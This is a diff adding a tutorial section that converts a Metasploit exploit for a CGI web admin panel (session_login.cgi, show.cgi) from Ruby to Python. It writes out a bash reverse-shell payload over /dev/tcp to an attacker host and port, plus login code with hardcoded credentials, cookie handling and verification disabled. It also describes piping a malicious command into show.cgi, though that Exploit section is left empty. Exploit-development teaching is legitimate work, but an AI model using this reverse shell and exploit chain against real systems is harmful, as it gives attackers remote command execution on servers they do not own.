@@ -306,6 +306,77 @@ You may sometimes find among proof of concept code that it contains unnecessary 
 
 ## Converting Ruby to Python
 
+Conversion Requirements:  
+
+  payload type: cmd or system shell
+  the login page URI data (credentials, receiving port and login page file)
+  POST request sending the URI data
+  format the cookie
+  verify HTTP response code and the session id is not empty, print statement to verify success
+  generate five random alphanumeric characters
+  store the system shell with a function, encode it and send it back via socket
+  send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command  
+
+Operational Requirements:  
+
+  Initialize Payload
+  Login
+  Exploit 
+
+### Initialize Payload
+
+Main Effort: Enable python to execute the system shell `/bin/sh` or `/bin/bash`.  
+
+#### Examples and Methods  
+
+[PayloadsAllTheThings Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)  
+[GTFOBINS](https://gtfobins.org/#+reverse%20shell)
+[One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+
+#### Selected Payload  
+
+payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"
+
+Conversion Requirement Met: payload type: cmd or system shell
+
+### Login
+
+When researching, it is necessary to check if the target is vulnerable to the exploit by sending a test command  
+Skipping in this lesson  
+The request should be fairly simple and we can go down our list item by item, using the `requests` library
+
+POST requests in python can send data to a server via a dictionary, list of tuples, bytes or a file object.  
+We only need three items to send as data: the page, username, and password.  
+From the developer tools we know the exact labels of each of these; page, user, and pass.
+
+  data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"} 
+  
+We can include a variable with the file to target using f-strings. We know the receiving port is the default port 80 so we don't need to include it manually.
+
+url = f"http://{targetIP}/session_login.cgi"
+
+Now we have all of the information we need to login via POST request. We'll be sending the credentials, the test cookie with its value, as well as ignoring TLS and site redirects.
+
+r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)
+
+Next we can include the if statement. We can check the status code and verify the cookies aren't empty using methods from the requests module.
+
+if r.status_code == 302 and r.cookies["sid"] != None
+
+In the metasploit module, the manual formatting of cookies with .split() is necessary but this is not the case in python. While we are able to include several methods to obtain the alphanumeric cookie, we can simply read the value from the header directly with r.cookies["sid"]. We can assemble a quick test and see each method of formatting the cookie works.
+
+
+We've now completed the login section of our exploit.
+
+    the login page URI data (credentials, receiving port and login page file)
+    POST request sending the URI data
+    format the cookie
+    verify HTTP response code and the session id is not empty, print statement to verify success
+
+### Exploit
+
+
+
 ## Final Exploit and Test
 
 ## Common Mistakes
